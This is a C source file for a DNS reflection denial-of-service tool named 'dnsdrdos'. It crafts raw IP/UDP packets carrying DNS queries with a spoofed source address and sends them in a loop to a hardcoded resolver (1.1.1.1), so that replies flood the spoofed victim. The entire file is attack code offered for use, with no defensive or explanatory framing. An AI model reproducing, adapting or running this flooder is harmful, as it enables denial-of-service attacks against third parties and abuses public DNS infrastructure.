
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <getopt.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <netinet/udp.h>



#define VERSION             "v0.1"
#define ATOI(x)             strtol(x, (char **) NULL, 10)
#define MAX_LEN             128     /* max line for dns server list */



#define DEFAULT_SPOOF_ADDR  "127.0.0.1"
#define DEFAULT_DOMAIN      "google.com."
#define DEFAULT_DNS_PORT    53
#define DEFAULT_LOOPS       10000



#define __EXIT_FAILURE      exit(EXIT_FAILURE);
#define __EXIT_SUCCESS      exit(EXIT_SUCCESS);

#define __ERR_GEN do { fprintf(stderr,"[-] ERROR: " __FILE__ ":%u -> ",\
                               __LINE__); fflush(stderr); perror(""); \
    __EXIT_FAILURE } while (0)



typedef struct {
    unsigned short id;
    unsigned char rd :1;
    unsigned char tc :1;
    unsigned char aa :1;
    unsigned char opcode :4;
    unsigned char qr :1;
    unsigned char rcode :4;
    unsigned char cd :1;
    unsigned char ad :1;
    unsigned char z :1;
    unsigned char ra :1;
    unsigned short q_count;
    unsigned short ans_count;
    unsigned short auth_count;
    unsigned short add_count;
} dnsheader_t;



typedef struct {
    unsigned short qtype;
    unsigned short qclass;
} query_t;



typedef struct {
    char *file;
    uint16_t port;
    unsigned int num_addrs;
    char *spoof_addr;
    char *domain;
    unsigned int loops;
} job_t;



typedef struct {
    int one;
    int sock;
    char *packet;
    struct sockaddr_in target;
    struct iphdr *ip;
    struct udphdr *udp;
    dnsheader_t *dns;
    query_t *query;
} bomb_t;


void *xmalloc(size_t);
void *xmemset(void *, int, size_t);
int xsocket(int, int, int);
void xclose(int);
void xsendto(int, const void *, size_t, int, const struct sockaddr *,
             socklen_t);

bomb_t *create_rawsock(bomb_t *);
bomb_t *stfu_kernel(bomb_t *);
unsigned short checksum(unsigned short *, int);
bomb_t *build_ip_header(bomb_t *, job_t *, int);
bomb_t *build_udp_header(bomb_t *, job_t *);
bomb_t *build_dns_request(bomb_t *, job_t *);
void dns_name_format(char *, char *);
bomb_t *build_packet(bomb_t *, job_t *, int);
bomb_t *fill_sockaddr(bomb_t *);
void run_dnsdrdos(job_t *, int);


void *xmalloc(size_t size)
{
   void *buff;


   if ((buff = malloc(size)) == NULL) {
       __ERR_GEN;
   }

   return buff;
}


void *xmemset(void *s, int c, size_t n)
{
   if (!(s = memset(s, c, n))) {
       __ERR_GEN;
   }

   return s;
}


int xsocket(int domain, int type, int protocol)
{
    int sockfd = 0;


    sockfd = socket(domain, type, protocol);

    if (sockfd == -1) {
        __ERR_GEN;
    }

    return sockfd;
}


void xsetsockopt(int sockfd, int level, int optname, const void *optval,
                 socklen_t optlen)
{
    int x = 0;


    x = setsockopt(sockfd, level, optname, optval, optlen);

    if (x != 0) {
        __ERR_GEN;
    }

    return;
}


void xclose(int fd)
{
    int x = 0;


    x = close(fd);

    if (x != 0) {
        __ERR_GEN;
    }

    return;
}

void xsendto(int sockfd, const void *buf, size_t len, int flags,
             const struct sockaddr *dest_addr, socklen_t addrlen)
{
    int x = 0;

    
    x = sendto(sockfd, buf, len, flags, dest_addr, addrlen);

    if (x == -1) {
        __ERR_GEN;
    }

    return;
}


job_t *set_defaults()
{
    job_t *job;


    job = (job_t *) xmalloc(sizeof(job_t));
    job = xmemset(job, 0x00, sizeof(job_t));

    job->port = (uint16_t) DEFAULT_DNS_PORT;
    job->spoof_addr = DEFAULT_SPOOF_ADDR;
    job->domain = DEFAULT_DOMAIN;
    job->loops = (unsigned int) DEFAULT_LOOPS;

    return job;
}


bomb_t *create_rawsock(bomb_t *bomb)
{
    bomb->sock = xsocket(AF_INET, SOCK_RAW, IPPROTO_RAW);

    return bomb;
}


bomb_t *stfu_kernel(bomb_t *bomb)
{
    bomb->one = 1;

    xsetsockopt(bomb->sock, IPPROTO_IP, IP_HDRINCL, &bomb->one, 
                sizeof(bomb->one));

    return bomb;
}



unsigned short checksum(unsigned short *addr, int len)
{
    u_int32_t cksum  = 0;
    
    
    while(len > 0) {
        cksum += *addr++;
        len -= 2;
    }

    if(len == 0) {
        cksum += *(unsigned char *) addr;
    }
    
    cksum = (cksum >> 16) + (cksum & 0xffff);
    cksum = cksum + (cksum >> 16);

    return (~cksum);
}


bomb_t *build_ip_header(bomb_t *bomb, job_t *job, int c)
{
    bomb->ip = (struct iphdr *) bomb->packet;

    bomb->ip->version = 4;
    bomb->ip->ihl = 5;
    bomb->ip->id = htonl(rand());
    bomb->ip->saddr = inet_addr(job->spoof_addr);
    bomb->ip->daddr = inet_addr("1.1.1.1");
    bomb->ip->ttl = 64;
    bomb->ip->tos = 0;
    bomb->ip->frag_off = 0;
    bomb->ip->protocol = IPPROTO_UDP;
    bomb->ip->tot_len = htons(sizeof(struct iphdr) + sizeof(struct udphdr) +
                              sizeof(dnsheader_t) + sizeof(query_t) +
                              strlen(job->domain) + 1);
    bomb->ip->check = checksum((unsigned short *) bomb->ip,
                               sizeof(struct iphdr));

    return bomb;
}


bomb_t *build_udp_header(bomb_t *bomb, job_t *job)
{
    bomb->udp = (struct udphdr *) (bomb->packet + sizeof(struct iphdr));

    bomb->udp->source = htons(rand());
    bomb->udp->dest = htons(DEFAULT_DNS_PORT);
    bomb->udp->len = htons(sizeof(struct udphdr) + sizeof(dnsheader_t) +
                           sizeof(query_t) + strlen(job->domain) + 1);
    bomb->udp->check = 0;

    return bomb;
}


void dns_name_format(char *qname, char *host)
{
    int i = 0;
    int j = 0;

    
    for (i = 0 ; i < (int) strlen(host) ; i++) {
        if (host[i] == '.') {
            *qname++ = i-j;
            for (; j < i; j++) {
                *qname++ = host[j];
            }
            j++;
        }
    }

    *qname++ = 0x00;
}

bomb_t *build_dns_request(bomb_t *bomb, job_t *job)
{
    char *qname = NULL;


    bomb->dns = (dnsheader_t *) (bomb->packet + sizeof(struct iphdr) + 
                           sizeof(struct udphdr));

    bomb->dns->id = (unsigned short) htons(getpid());
    bomb->dns->qr = 0;
    bomb->dns->opcode = 0;
    bomb->dns->aa = 0;
    bomb->dns->tc = 0;
    bomb->dns->rd = 1;
    bomb->dns->ra = 0;
    bomb->dns->z = 0;
    bomb->dns->ad = 0;
    bomb->dns->cd = 0;
    bomb->dns->rcode = 0;
    bomb->dns->q_count = htons(1);
    bomb->dns->ans_count = 0;
    bomb->dns->auth_count = 0;
    bomb->dns->add_count = 0;

    qname = &bomb->packet[sizeof(struct iphdr) + sizeof(struct udphdr) + 
        sizeof(dnsheader_t)];

    dns_name_format(qname, job->domain);

    bomb->query = (query_t *) &bomb->packet[sizeof(struct iphdr) + 
        sizeof(struct udphdr) + sizeof(dnsheader_t) + (strlen(qname) + 1)];

    bomb->query->qtype = htons(1);
    bomb->query->qclass = htons(1);

    return bomb;
}

bomb_t *build_packet(bomb_t *bomb, job_t *job, int c)
{
    bomb->packet = (char *) xmalloc(1400);
    bomb->packet = xmemset(bomb->packet, 0x00, 1400);

    bomb = build_ip_header(bomb, job, c);
    bomb = build_udp_header(bomb, job);
    bomb = build_dns_request(bomb, job);

    return bomb;
}



bomb_t *fill_sockaddr(bomb_t *bomb)
{
    bomb->target.sin_family = AF_INET;
    bomb->target.sin_port = bomb->udp->dest;
    bomb->target.sin_addr.s_addr = bomb->ip->daddr;

    return bomb;
}


void run_dnsdrdos(job_t *job, int c)
{
    bomb_t *bomb = NULL;

    
    bomb = (bomb_t *) xmalloc(sizeof(bomb_t));
    bomb = xmemset(bomb, 0x00, sizeof(bomb_t));

    bomb = create_rawsock(bomb);
    bomb = stfu_kernel(bomb);
    bomb = build_packet(bomb, job, c);
    bomb = fill_sockaddr(bomb);

    xsendto(bomb->sock, bomb->packet, sizeof(struct iphdr) + 
            sizeof(struct udphdr) + sizeof(dnsheader_t) + sizeof(query_t) + 
            strlen(job->domain) + 1, 0, (struct sockaddr *) &bomb->target, 
            sizeof(bomb->target));

    xclose(bomb->sock);
    free(bomb->packet);
    free(bomb);

    return;
}


int main(int argc, char **argv)
{
    int c = 0;
    unsigned int i = 0;
    job_t *job;

    job = set_defaults();

    while ((c = getopt(argc, argv, "f:s:d:l:VH")) != -1) {
        switch (c) {
         case 's':
             job->spoof_addr = optarg;
             break;
         case 'd':
             job->domain = optarg;
             break;
         case 'l':
             job->loops = (unsigned int) ATOI(optarg);
             break;
         case 'V':
             puts(VERSION);
             __EXIT_SUCCESS;
             break;

             __EXIT_SUCCESS;
        }
    }
    
    job->num_addrs = 1;
    
        
    for (i = 0; i < job->loops; i++) {
        for (c = 0; c < job->num_addrs; c++) {
            run_dnsdrdos(job, c);
        }
    }
    printf("\n");
    
        
    return 0;
}

/* EOF */
